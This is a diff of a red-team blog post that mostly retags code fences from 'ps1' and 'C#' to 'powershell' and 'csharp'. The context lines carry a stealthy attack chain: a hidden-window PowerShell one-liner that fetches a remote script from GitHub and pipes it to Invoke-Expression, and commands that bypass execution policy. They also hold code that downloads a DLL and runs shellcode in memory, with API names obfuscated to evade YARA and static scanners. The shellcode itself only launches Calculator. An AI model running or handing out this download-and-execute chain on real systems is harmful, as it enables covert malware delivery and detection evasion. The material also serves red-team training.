@@ -50,13 +50,13 @@ Here's our Execution Workflow
 ***The Stager***
 -
 
-```ps1
+```powershell
 powershell -w h -c "iwr 'https://raw.githubusercontent.com/g3tsyst3m/undertheradar/refs/heads/main/loadsc_dynamic2.ps1' | iex"
 ```
 
 This can be ran any way you like for your red team campaign.  It's a simple one-liner.  There are some caveats to this running as expected.  You will of course want to ensure you have Execution Policy set correctly to allow script execution:
 
-```ps1
+```powershell
 Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
 # or
 Set-ExecutionPolicy Bypass -Scope CurrentUser
@@ -66,7 +66,7 @@ Set-ExecutionPolicy Bypass -Scope Process
 
 If you cannot or don't want to permanently change the execution policy, run your command like this:
 
-```ps1
+```powershell
 powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iwr 'https://raw.githubusercontent.com/g3tsyst3m/undertheradar/refs/heads/main/loadsc_dynamic2.ps1' | iex"
 ```
 This tells PowerShell to bypass the policy just for this session.
@@ -95,7 +95,7 @@ Now, let's review the code for the stager.  I intentionally did not include erro
     - iex (Invoke-Expression) executes the string stored in $code as PowerShell code.
     - This runs the whole process: download DLL → load it → invoke the shellcode execution method — all in memory.
 
-```ps1
+```powershell
 $code = @'
 # Download the DLL as a byte array
 $url = 'https://github.com/g3tsyst3m/undertheradar/raw/refs/heads/main/ClassLibrary3.dll'
@@ -137,7 +137,7 @@ All dynamically and stealthily via PowerShell in-memory execution.  😸
 
 This is fairly straight forward .NET DLL code.  I do some very rudimentary obfuscating of API names that way YARA and other static analysis tools don't see `CreateThread` and `VirtualAlloc` in the clear when running the strings command.  Check it out:
 
-```ps1
+```powershell
 strings C:\Users\g3tsyst3m\Documents\GitHub\elevationstation_local\ClassLibrary3\ClassLibrary3\bin\Debug\ClassLibrary3.dll
 ```
 
@@ -145,7 +145,7 @@ strings C:\Users\g3tsyst3m\Documents\GitHub\elevationstation_local\ClassLibrary3
 
 I also went with my own custom shellcode, NOT using MSFVENOM.  Check out my shellcoding and assembly series if you'd like to learn more!  This particular shellcode executes the Calculator via WinExec and then calls ExitThread:
 
-```C#
+```csharp
     static readonly byte[] shellcode = new byte[]
     {
 0x48,0x83,0xec,0x28,0x48,0x83,0xe4,0xf0,0x48,0x31,
@@ -184,7 +184,7 @@ I also went with my own custom shellcode, NOT using MSFVENOM.  Check out my shel
 
 And lastly, the C# DLL code, in full.  I won't be able to go through each line and explain this code in this post, but if you'd like to dive deeper with understanding how it all works, hit me up.  I don't meant to constantly advertise my membership offering, but I do think it's really helpful for folks that wish to take things further than what I capture in my blog.  Check out the link at the top-right corner of my blog for more info.  It looks like this: "Partner / Donate / Become a Member!".  Ok, let's go!
 
-```C#
+```csharp
 using System;
 using System.Runtime.InteropServices;
 //using System.Threading;
